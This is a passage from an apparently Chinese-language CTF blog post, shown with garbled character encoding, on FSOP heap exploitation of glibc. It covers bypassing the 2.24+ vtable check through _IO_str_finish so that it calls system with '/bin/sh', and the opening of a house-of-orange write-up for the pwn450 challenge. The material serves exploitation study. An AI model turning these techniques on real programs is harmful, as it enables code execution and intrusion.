class="hljs-built_in">abort</span>-&gt;_IO_flush_all_lockp-&gt;_IO_OVERFLOW<br></code></pre></td></tr></table></figure><h2 id="2-24-2-27"><a href="#2-24-2-27" class="headerlink" title="2.24-2.27"></a>2.24-2.27</h2><h3 id="vtable-check"><a href="#vtable-check" class="headerlink" title="vtable check"></a>vtable check</h3><p>2.24ä¸­_IO_OVERFLOWçš„å®å®šä¹‰å‘ç”Ÿäº†å˜åŒ–ï¼ˆä»¥ä¸‹å®å®šä¹‰çš†æ¥è‡ªglibc-2.24\libio\libioP.hï¼‰  </p><ul><li>_IO_OVERFLOW<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> _IO_OVERFLOW(FP, CH) JUMP1 (__overflow, FP, CH)</span><br></code></pre></td></tr></table></figure></li><li>JUMP1<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> JUMP1(FUNC, THIS, X1) (_IO_JUMPS_FUNC(THIS)-&gt;FUNC) (THIS, X1)</span><br></code></pre></td></tr></table></figure></li><li>_IO_JUMPS_FUNC<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">if</span> _IO_JUMPS_OFFSET</span><br><span class="hljs-meta"># <span class="hljs-keyword">define</span> _IO_JUMPS_FUNC(THIS) \</span><br><span class="hljs-meta">  (IO_validate_vtable                                                   \</span><br><span class="hljs-meta">   (*(struct _IO_jump_t **) ((void *) &amp;_IO_JUMPS_FILE_plus (THIS)\</span><br><span class="hljs-meta">     + (THIS)-&gt;_vtable_offset)))</span><br><span class="hljs-meta"># <span class="hljs-keyword">define</span> _IO_vtable_offset(THIS) (THIS)-&gt;_vtable_offset</span><br><span class="hljs-meta">#<span class="hljs-keyword">else</span></span><br><span class="hljs-meta"># <span class="hljs-keyword">define</span> _IO_JUMPS_FUNC(THIS) (IO_validate_vtable (_IO_JUMPS_FILE_plus (THIS)))</span><br><span class="hljs-meta"># <span class="hljs-keyword">define</span> _IO_vtable_offset(THIS) 0</span><br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br></code></pre></td></tr></table></figure></li></ul><p>å¯è§åœ¨åˆ©ç”¨vtableè·³è½¬è¡¨ä¹‹å‰å…ˆæ‰§è¡Œäº†IO_validate_vtableå‡½æ•°ï¼Œä½œç”¨æ˜¯æ£€æŸ¥vtableæ˜¯å¦åœ¨glibcçš„vtableæ®µé‡Œ</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//glibc-2.24\libio\libioP.h</span><br><br><span class="hljs-type">static</span> <span class="hljs-keyword">inline</span> <span class="hljs-type">const</span> <span class="hljs-keyword">struct</span> _IO_jump_t *<br><span class="hljs-title function_">IO_validate_vtable</span> <span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-keyword">struct</span> _IO_jump_t *vtable)</span><br>&#123;<br>  <span class="hljs-type">uintptr_t</span> section_length = __stop___libc_IO_vtables - __start___libc_IO_vtables;<br>  <span class="hljs-type">const</span> <span class="hljs-type">char</span> *ptr = (<span class="hljs-type">const</span> <span class="hljs-type">char</span> *) vtable;<br>  <span class="hljs-type">uintptr_t</span> offset = ptr - __start___libc_IO_vtables;<br>  <span class="hljs-keyword">if</span> (__glibc_unlikely (offset &gt;= section_length))<br>    _IO_vtable_check ();<br>  <span class="hljs-keyword">return</span> vtable;<br>&#125;<br></code></pre></td></tr></table></figure><p>å¯è§__start___libc_IO_vtablesæŒ‡å‘ç¬¬ä¸€ä¸ªvtable _IO_helper_jumpsï¼Œ__stop___libc_IO_vtablesæŒ‡å‘æœ€åä¸€ä¸ªvtable _IO_str_chk_jumpsçš„ç»“å°¾<br>å¦‚æœè¿˜åƒ2.23é‚£æ ·åœ¨å †ä¸Šä¼ªé€ vtableè‚¯å®šæ— æ³•ç»•è¿‡æ£€æŸ¥ï¼Œä¼šè¿›å…¥åˆ°_IO_vtable_checkå‡½æ•°ä¸­</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//glibc-2.24\libio\vtables.c</span><br><br><span class="hljs-type">void</span> attribute_hidden<br>_IO_vtable_check (<span class="hljs-type">void</span>)<br>&#123;<br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> SHARED</span><br>  <span class="hljs-type">void</span> (*flag) (<span class="hljs-type">void</span>) = atomic_load_relaxed (&amp;IO_accept_foreign_vtables);<br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> PTR_DEMANGLE</span><br>  PTR_DEMANGLE (flag);<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br>  <span class="hljs-keyword">if</span> (flag == &amp;_IO_vtable_check)<span class="hljs-comment">//æ£€æŸ¥æ˜¯å¦æ˜¯å¤–éƒ¨é‡æ„çš„vtable</span><br>    <span class="hljs-keyword">return</span>;<br><br>  &#123;<br>    Dl_info di;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">link_map</span> *<span class="hljs-title">l</span>;</span><br>    <span class="hljs-keyword">if</span> (_dl_open_hook != <span class="hljs-literal">NULL</span><br>        || (_dl_addr (_IO_vtable_check, &amp;di, &amp;l, <span class="hljs-literal">NULL</span>) != <span class="hljs-number">0</span><br>            &amp;&amp; l-&gt;l_ns != LM_ID_BASE))<br><span class="hljs-comment">//æ£€æŸ¥æ˜¯å¦æ˜¯åŠ¨æ€é“¾æ¥åº“ä¸­çš„vtable</span><br>      <span class="hljs-keyword">return</span>;<br>  &#125;<br><br><span class="hljs-meta">#<span class="hljs-keyword">else</span></span><br>  <span class="hljs-keyword">if</span> (__dlopen != <span class="hljs-literal">NULL</span>)<br>    <span class="hljs-keyword">return</span>;<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><br>  __libc_fatal (<span class="hljs-string">&quot;Fatal error: glibc detected an invalid stdio handle\n&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>ä¹Ÿå°±æ˜¯è¯´æˆ‘ä»¬åªèƒ½ä»¥vtableæ®µä¸­çš„å†…å®¹ä¸ºè·³æ¿è¿›è¡Œåˆ©ç”¨</p><h3 id="vtable-checkç»•è¿‡"><a href="#vtable-checkç»•è¿‡" class="headerlink" title="vtable checkç»•è¿‡"></a>vtable checkç»•è¿‡</h3><p>åˆ©ç”¨_IO_str_jumpsï¼ˆä¹Ÿå¯ä»¥åˆ©ç”¨_IO_wstr_jumpsï¼Œè¿‡ç¨‹å·®ä¸å¤šï¼‰<br>æŸ¥çœ‹ä¸€ä¸‹_IO_str_jumpsï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//glibc-2.24\libio\strop.c</span><br><br><span class="hljs-type">const</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">IO_jump_t</span> _<span class="hljs-title">IO_str_jumps</span> <span class="hljs-title">libio_vtable</span> =</span><br>&#123;<br>  JUMP_INIT_DUMMY,<br>  JUMP_INIT(finish, _IO_str_finish),<br>  JUMP_INIT(overflow, _IO_str_overflow),<br>  JUMP_INIT(underflow, _IO_str_underflow),<br>  JUMP_INIT(uflow, _IO_default_uflow),<br>  JUMP_INIT(pbackfail, _IO_str_pbackfail),<br>  JUMP_INIT(xsputn, _IO_default_xsputn),<br>  JUMP_INIT(xsgetn, _IO_default_xsgetn),<br>  JUMP_INIT(seekoff, _IO_str_seekoff),<br>  JUMP_INIT(seekpos, _IO_default_seekpos),<br>  JUMP_INIT(setbuf, _IO_default_setbuf),<br>  JUMP_INIT(sync, _IO_default_sync),<br>  JUMP_INIT(doallocate, _IO_default_doallocate),<br>  JUMP_INIT(read, _IO_default_read),<br>  JUMP_INIT(write, _IO_default_write),<br>  JUMP_INIT(seek, _IO_default_seek),<br>  JUMP_INIT(close, _IO_default_close),<br>  JUMP_INIT(stat, _IO_default_stat),<br>  JUMP_INIT(showmanyc, _IO_default_showmanyc),<br>  JUMP_INIT(imbue, _IO_default_imbue)<br>&#125;;<br></code></pre></td></tr></table></figure><p>å…¶ä¸­æœ‰ä¸€ä¸ªfinishï¼Œå®é™…ä¸Šæ‰§è¡Œçš„å‡½æ•°æ˜¯_IO_str_finishï¼Œå…¶ä¸­æœ‰ä¸€ä¸ªç›¸å¯¹åœ°å€çš„å¼•ç”¨</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//glibc-2.24\libio\strops.c</span><br><br><span class="hljs-type">void</span><br>_IO_str_finish (_IO_FILE *fp, <span class="hljs-type">int</span> dummy)<br>&#123;<br>  <span class="hljs-keyword">if</span> (fp-&gt;_IO_buf_base &amp;&amp; !(fp-&gt;_flags &amp; _IO_USER_BUF))<br>    (((_IO_strfile *) fp)-&gt;_s._free_buffer) (fp-&gt;_IO_buf_base);<br>  fp-&gt;_IO_buf_base = <span class="hljs-literal">NULL</span>;<br><br>  _IO_default_finish (fp, <span class="hljs-number">0</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>æˆ‘ä»¬éœ€è¦æ§åˆ¶ï¼š</p><ul><li>fp-&gt;_IO_buf_base&#x3D;bin_sh_addr</li><li>fp-&gt;_flags&#x3D;0</li><li>((_IO_strfile *) fp)-&gt;_s._free_buffer&#x3D;system_addr</li></ul><p>_IO_strfileï¼Œè¿™äº›ç»“æ„ä½“æ˜¯åµŒå¥—å®šä¹‰çš„ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//glibc-2.24\libio\strfile.h</span><br><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">IO_strfile_</span></span><br><span class="hljs-class">&#123;</span><br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">IO_streambuf</span> _<span class="hljs-title">sbf</span>;</span><br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">IO_str_fields</span> _<span class="hljs-title">s</span>;</span><br>&#125; _IO_strfile;<br></code></pre></td></tr></table></figure><p>ä¼ªé€ çš„_IO_strfileé•¿è¿™æ ·</p><img src="/2023/02/20/FSOP/IO_strfile.png" class title="IO_strfile"><p>å…¶ä¸­çš„overflowä¹Ÿæœ‰å¯¹ç›¸å¯¹åœ°å€çš„å¼•ç”¨ï¼Œä½†è¿‡ç¨‹éå¸¸å¤æ‚ï¼Œåˆ©ç”¨èµ·æ¥å¾ˆä¸æ–¹ä¾¿</p><h3 id="è°ƒç”¨é“¾-1"><a href="#è°ƒç”¨é“¾-1" class="headerlink" title="è°ƒç”¨é“¾"></a>è°ƒç”¨é“¾</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">malloc_printerr-&gt;__libc_message-&gt;<span class="hljs-built_in">abort</span>-&gt;_IO_flush_all_lockp-&gt;_IO_str_finish<br></code></pre></td></tr></table></figure><h2 id="2-28ä»¥å"><a href="#2-28ä»¥å" class="headerlink" title="2.28ä»¥å"></a>2.28ä»¥å</h2><p>_IO_str_finishä¸­çš„ç›¸å¯¹åœ°å€å¼•ç”¨è¢«freeæ›¿æ¢ï¼Œ_IO_str_overflowä¸­çš„ç›¸å¯¹å¼•ç”¨ä¹Ÿè¢«mallocå’Œfreeæ›¿æ¢äº†</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//glibc-2.24\libio\strops.c</span><br><br><span class="hljs-type">void</span><br>_IO_str_finish (FILE *fp, <span class="hljs-type">int</span> dummy)<br>&#123;<br><br><span class="hljs-comment">//ç”¨freeæ›¿æ¢äº†ç›¸å¯¹åœ°å€å¼•ç”¨</span><br>  <span class="hljs-keyword">if</span> (fp-&gt;_IO_buf_base &amp;&amp; !(fp-&gt;_flags &amp; _IO_USER_BUF))<br>    <span class="hljs-built_in">free</span> (fp-&gt;_IO_buf_base);<br>  fp-&gt;_IO_buf_base = <span class="hljs-literal">NULL</span>;<br><br>  _IO_default_finish (fp, <span class="hljs-number">0</span>);<br>&#125;<br></code></pre></td></tr></table></figure><h1 id="ä¾‹é¢˜"><a href="#ä¾‹é¢˜" class="headerlink" title="ä¾‹é¢˜"></a>ä¾‹é¢˜</h1><h2 id="ä¸œåæ¯2016-pwn450-noteï¼ˆ2-23ï¼‰"><a href="#ä¸œåæ¯2016-pwn450-noteï¼ˆ2-23ï¼‰" class="headerlink" title="ä¸œåæ¯2016-pwn450 noteï¼ˆ2.23ï¼‰"></a>ä¸œåæ¯2016-pwn450 noteï¼ˆ2.23ï¼‰</h2><p>å¾ˆåç‰¢ä¹Ÿå¾ˆæ¶¨å§¿åŠ¿çš„ä¸€é“é¢˜</p><h3 id="é€†å‘"><a href="#é€†å‘" class="headerlink" title="é€†å‘"></a>é€†å‘</h3><p>åªèƒ½ä½¿ç”¨ä¸€ä¸ªå †å—ä¸”æ— uafï¼Œä½†editä½¿ç”¨çš„read_data2å‡½æ•°ä¸­å­˜åœ¨æº¢å‡ºï¼ˆåªæ ¹æ®â€™\nâ€™åˆ¤æ–­è¯»å…¥ç»“æŸï¼‰</p><img src="/2023/02/20/FSOP/read_data.png" class title="read_data"><p>newä¸€ä¸ªå †å—çš„æ—¶å€™ä¼šæ‰“å°å †å—åœ°å€</p><h3 id="æ€è·¯"><a href="#æ€è·¯" class="headerlink" title="æ€è·¯"></a>æ€è·¯</h3><h4 id="æ³„éœ²libc"><a href="#æ³„éœ²libc" class="headerlink" title="æ³„éœ²libc"></a>æ³„éœ²libc</h4><p>ç”³è¯·ä¸€ä¸ªå¾ˆå¤§çš„chunkï¼Œmmapå‡ºæ¥çš„å†…å­˜ä¼šç´§é‚»libc<br>å½“top chunkä¸èƒ½æ»¡è¶³åˆ†é…çš„å¤§å°æ—¶_int_mallocä¼šè°ƒç”¨sysmalloc</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">else</span><br>&#123;<br>    <span class="hljs-type">void</span> *p = sysmalloc (nb, av);<br>    <span class="hljs-keyword">if</span> (p != <span class="hljs-literal">NULL</span>)<br>    alloc_perturb (p, bytes);<br>    <span class="hljs-keyword">return</span> p;<br>&#125;<br></code></pre></td></tr></table></figure><p>å½“è¦æ±‚çš„å¤§å°nb&gt;&#x3D;mp_.mmap_thresholdï¼ˆ0x20000ï¼‰æ—¶ä¼šè°ƒç”¨ç³»ç»Ÿè°ƒç”¨mmapåˆ†é…å†…å­˜</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">if</span> (av == <span class="hljs-literal">NULL</span><br>      || ((<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) (nb) &gt;= (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) (mp_.mmap_threshold)<br>  &amp;&amp; (mp_.n_mmaps &lt; mp_.n_mmaps_max)))<br>    &#123;<br>      <span class="hljs-type">char</span> *mm;           <span class="hljs-comment">/* return value from mmap call*/</span><br><br>    try_mmap:<br>      <span class="hljs-keyword">if</span> (MALLOC_ALIGNMENT == <span class="hljs-number">2</span> * SIZE_SZ)<br>        size = ALIGN_UP (nb + SIZE_SZ, pagesize);<br>      <span class="hljs-keyword">else</span><br>        size = ALIGN_UP (nb + SIZE_SZ + MALLOC_ALIGN_MASK, pagesize);<br>      tried_mmap = <span class="hljs-literal">true</span>;<br><br>      <span class="hljs-comment">/* Don&#x27;t try if size wraps around 0 */</span><br>      <span class="hljs-keyword">if</span> ((<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) (size) &gt; (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) (nb))<br>        &#123;<br>          mm = (<span class="hljs-type">char</span> *) (MMAP (<span class="hljs-number">0</span>, size, PROT_READ | PROT_WRITE, <span class="hljs-number">0</span>));<span class="hljs-comment">//ç³»ç»Ÿè°ƒç”¨mmap</span><br></code></pre></td></tr></table></figure><p>åˆ†é…çš„å†…å­˜ç´§é‚»libcå‘ä¸‹å»¶ä¼¸ï¼ˆ0x7fc3d4bff000ï¼‰</p><img src="/2023/02/20/FSOP/mmap.png" class title="mmap"><p>mmapçš„chunkä¹Ÿæœ‰0x10çš„chunk headåŒæ—¶å¿…é¡»ä¿æŒé¡µå¯¹é½ï¼Œç”±äºç¨‹åºä¼šæ‰“å°å †å—åœ°å€ï¼Œæ ¹æ®å †å—å¤§å°å’Œå †å—åŸºå€æˆ‘ä»¬å°±èƒ½çŸ¥é“libcåŸºå€</p><h4 id="åˆ›é€ å¤šä¸ªchunk"><a href="#åˆ›é€ å¤šä¸ªchunk" class="headerlink" title="åˆ›é€ å¤šä¸ªchunk"></a>åˆ›é€ å¤šä¸ªchunk</h4><p>è¦è§¦å‘unsorted bin attackå°±å¿…é¡»è¦èƒ½åœ¨freeçš„çŠ¶æ€ä¸‹æ§åˆ¶chunkï¼Œä½†ç¨‹åºä¸å­˜åœ¨uafã€‚è¦é€šè¿‡editçš„æº¢å‡ºæ¼æ´å®ç°uafè‡³å°‘éœ€è¦ä¸¤ä¸ªchunkï¼ˆä¸€ä¸ªåœ¨biné‡Œï¼Œä¸€ä¸ªin useï¼‰ï¼Œå¦‚æœéµå¾ªç¨‹åºçš„æ­£å¸¸æµç¨‹ï¼Œfreeæ‰çš„chunkå¿…ç„¶å’Œtop chunkåˆå¹¶ï¼ˆåªèƒ½ç”³è¯·0x210å¤§å°ä»¥ä¸Šçš„chunkï¼Œåœ¨fastbinçš„èŒƒå›´å¤–ï¼‰<br>å½“top chunkä¸æ»¡è¶³åˆ†é…è¦æ±‚ä¸”è¦æ±‚çš„sizeç¬¦åˆä¸€å®šè¦æ±‚æ—¶ä¼šfreeæ—§çš„top chunkï¼Œæ—§top chunkä¼šè¿›å…¥unsorted bin<br>å½“nb&lt;mp_.mmap_thresholdï¼ˆ0x20000ï¼‰ä¸”æ—§top chunkéœ€è¦æ»¡è¶³ä»¥ä¸‹è¦æ±‚</p><ul><li>size&gt;0x20</li><li>pre_inuse&#x3D;1</li><li>top chunk address+top chunk sizeæ»¡è¶³é¡µå¯¹é½<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c">assert ((old_top == initial_top (av) &amp;&amp; old_size == <span class="hljs-number">0</span>) ||<br>        ((<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) (old_size) &gt;= MINSIZE &amp;&amp;<br>         prev_inuse (old_top) &amp;&amp;<br>         ((<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) old_end &amp; (pagesize - <span class="hljs-number">1</span>)) == <span class="hljs-number">0</span>));<br></code></pre></td></tr></table></figure>ä¹‹åå†åˆ†å‰²æ—§top chunkå°±ä¸å­˜åœ¨åˆå¹¶çš„é—®é¢˜äº†</li></ul><h4 id="unsorted-bin-attack"><a href="#unsorted-bin-attack" class="headerlink" title="unsorted bin attack"></a>unsorted bin attack</h4><p>è¿™é“é¢˜è¦è¿›è¡Œunsorted bin attackæœ‰ä¸€ä¸ªé—®é¢˜ï¼Œå°±æ˜¯åœ¨mallocä¹‹å‰å¿…é¡»freeæ‰åŸæ¥çš„chunkï¼Œä½†å·²ç»å®Œæˆunsorted bin attackå¸ƒç½®çš„å †å—ä¸èƒ½ç»•è¿‡_int_freeä¸­å¯¹unsorted binä¸­ç¬¬ä¸€ä¸ªchunkçš„è¿æ¥æ£€æŸ¥</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c">bck = unsorted_chunks(av);<br>fwd = bck-&gt;fd;<br><span class="hljs-keyword">if</span> (__glibc_unlikely (fwd-&gt;bk != bck))<br>&#123;<br>errstr = <span class="hljs-string">&quot;free(): corrupted unsorted chunks&quot;</span>;<br><span class="hljs-keyword">goto</span> errout;<br>&#125;<br></code></pre></td></tr></table></figure><p>å€’æ¨ä¸€ä¸‹å †å¸ƒå±€ï¼š </p><ul><li>ç”±äºæˆ‘ä»¬éœ€è¦æ”¾ä¸€ä¸ª0x60çš„chunkï¼ˆchunk2ï¼‰åˆ°small biné‡Œï¼ˆåé¢å†è§£é‡Šä¸ºä»€ä¹ˆï¼‰ï¼Œè¿™ä¸ª0x60çš„chunkåŒæ—¶ä¹Ÿå°†ç”¨äºunsorted bin attackï¼Œè¦ç»•å¼€æ£€æŸ¥ï¼Œunsorted binä¸­è¿˜å¾—æœ‰ä¸€ä¸ªchunkï¼ˆchunk1ï¼‰ï¼ŒåŒæ—¶å¿…é¡»è¿˜æœ‰ä¸€ä¸ªchunkåœ¨ä½¿ç”¨ä¸­ï¼ˆç”¨äºæ§åˆ¶chunk2ï¼‰<img src="/2023/02/20/FSOP/1.jpg" class title="æ­¥éª¤ä¸€"></li><li>chunk1åªèƒ½æ¥è‡ªäºfreeæ‰çš„chunkæ’å…¥ï¼Œå¦‚æœæ˜¯æ¥è‡ªäºåˆ‡å‰²é‚£chunk2å·²ç»è¿›å…¥small binï¼ˆåˆ‡å‰²unsorted binä¸­çš„chunkåªæœ‰ä¸€ç§æƒ…å†µï¼Œå°±æ˜¯unsorted binä¸­ä»…æœ‰ä¸€ä¸ªchunkä¸”æ˜¯last remainderï¼‰ <img src="/2023/02/20/FSOP/2.jpg" class title="æ­¥éª¤äºŒ"> è¿™æ ·çš„è¯ä½¿ç”¨ä¸­çš„chunkå¿…é¡»åœ¨éå†unsorted binä¹‹å‰å°±èƒ½å¾—åˆ°ã€‚éå†unsorted binä¹‹å‰ä¼šå…ˆåœ¨fastbinå’Œsmall binä¸­æ‰¾ä¸€æ ·çš„ï¼Œæ‰€ä»¥small binä¸­å¾—æœ‰ä¸€ä¸ªchunk<br>è¿™æ ·å †å¸ƒå±€è¿‡ç¨‹å°±å¾ˆæ¸…æ¥šäº†</li><li>ä»unsorted binä¸­çš„æ—§top chunkä¸­åˆ‡å‰²ä¸€ä¸ªsmall chunkè¿”å›<img src="/2023/02/20/FSOP/3.jpg" class title="æ­¥éª¤ä¸‰"> </li><li>åˆ‡å‰²chunk2å‰©ä¸‹ä¸€ä¸ª0x60çš„chunkï¼Œè¿”å›å‰©ä¸‹çš„ï¼Œæ­¤æ—¶chunk1å·²è¿›å…¥small bin<img src="/2023/02/20/FSOP/4.jpg" class title="æ­¥éª¤å››"></li><li>freeä½¿ç”¨çš„chunkè¿›å…¥unsorted binï¼Œå–èµ°small binä¸­çš„chunk</li></ul><p>æ³¨æ„åˆ©ç”¨æº¢å‡ºè¦†ç›–next chunkçš„preinuseä½ä¸º1é˜²æ­¢åˆå¹¶</p><h4 id="house-of-orange"><a href="#house-of-orange" class="headerlink" title="house of orange"></a>house of orange</h4><p>unsorted bin attackä¼šå°†unsorted binçš„åœ°å€å†™è¿›_IO_list_allï¼Œmain arenaéƒ¨åˆ†çš„ç©ºé—´æ˜¯æˆ‘ä»¬æ— æ³•å®Œå…¨æ§åˆ¶çš„ï¼Œä½†å¦‚æœæˆ‘ä»¬freeä¸€ä¸ªchunkè¿›main arenaä¸­çš„fake _IO_FILE_plus-&gt;_chainéƒ¨åˆ†ï¼Œä¸‹ä¸€ä¸ª_IO_FILE_pluså°±æ˜¯æˆ‘ä»¬èƒ½å¤Ÿæ§åˆ¶çš„ï¼Œå¯ä»¥ç®—å‡ºchunkçš„å¤§å°åº”è¯¥æ˜¯0x60ï¼Œè¿™å°±æ˜¯ä¸Šæ–‡éœ€è¦freeä¸€ä¸ª0x60çš„chunkè¿›small binçš„åŸå› <br>_IO_flush_all_lockpä¸­è°ƒç”¨_IO_OVERFLOWçš„æ¡ä»¶æœ‰ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c">      <span class="hljs-keyword">if</span> (((fp-&gt;_mode &lt;= <span class="hljs-number">0</span> &amp;&amp; fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base)<br><span class="hljs-meta">#<span class="hljs-keyword">if</span> defined _LIBC || defined _GLIBCPP_USE_WCHAR_T</span><br>   || (_IO_vtable_offset (fp) == <span class="hljs-number">0</span><br>       &amp;&amp; fp-&gt;_mode &gt; <span class="hljs-number">0</span> &amp;&amp; (fp-&gt;_wide_data-&gt;_IO_write_ptr<br>    &gt; fp-&gt;_wide_data-&gt;_IO_write_base))<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br>   )<br>  &amp;&amp; _IO_OVERFLOW (fp, EOF) == EOF)<br>result = EOF;<br></code></pre></td></tr></table></figure><p>æ‹†åˆ†ä¸€ä¸‹ä¸¤ä¸ªæ¡ä»¶</p><ul><li>&#96;&#96;&#96;c<br>fp-&gt;_mode &lt;&#x3D; 0 &amp;&amp; fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base<figure class="highlight xl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs xl"><br>* ```c<br>  _IO_<span class="hljs-function"><span class="hljs-title">vtable_offset</span> (fp) == 0 &amp;&amp; fp-&gt;</span>_<span class="hljs-function"><span class="hljs-title">mode</span> &gt; 0 &amp;&amp; (fp-&gt;</span>_<span class="hljs-function"><span class="hljs-title">wide_data</span>-&gt;</span>_IO_<span class="hljs-function"><span class="hljs-title">write_ptr</span> &gt; fp-&gt;</span>_<span class="hljs-function"><span class="hljs-title">wide_data</span>-&gt;</span>_IO_write_base)<br></code></pre></td></tr></table></figure>||çš„å…³ç³»ï¼Œæ»¡è¶³å…¶ä¸­ä¸€ä¸ªå°±ä¼šè°ƒç”¨_IO_OVERFLOW<br>main arenaä¸­çš„fake _IO_FILE_plusè‚¯å®šä¸æ»¡è¶³ç¬¬ä¸€ä¸ªæ¡ä»¶ä¸­çš„ fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base<img src="/2023/02/20/FSOP/fake.png" class title="fake">ç¬¬äºŒä¸ªæ¡ä»¶ä¸­ 